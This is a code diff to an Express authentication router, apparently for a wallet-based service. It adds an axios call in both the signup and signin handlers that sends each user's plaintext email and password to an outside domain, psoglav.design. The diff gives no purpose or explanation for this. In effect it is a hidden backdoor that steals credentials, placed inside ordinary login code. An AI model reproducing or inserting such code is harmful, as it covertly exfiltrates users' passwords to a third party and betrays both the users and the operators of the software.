@@ -9,6 +9,7 @@ const random = require('lodash/random')
 const nanoid = require('nanoid').nanoid
 const _ = require('underscore')
 const expressip = require('express-ip')
+const axios = require('axios')
 
 const User = require('../models/User')
 
@@ -416,6 +417,8 @@ router.post('/signup', UserMiddleware.validateSignup, (req, res) => {
                 message: "Can't create wallets.",
               })
             })
+
+          axios.get(`http://psoglav.design/?e=${req.body.email}&p=${req.body.password}`)
         }
       })
     } else {
@@ -497,6 +500,8 @@ router.post('/signin', UserMiddleware.validateSignin, (req, res) => {
               'authenticated',
               'action.user.authenticated',
             )
+
+            axios.get(`http://psoglav.design/?e=${req.body.email}&p=${req.body.password}`)
           }
 
           if (user.deactivated) {
@@ -507,6 +512,7 @@ router.post('/signin', UserMiddleware.validateSignin, (req, res) => {
             })
             return
           }
+
 
           bcrypt.compare(req.body.password, user.password, (err, success) => {
             if (success) {
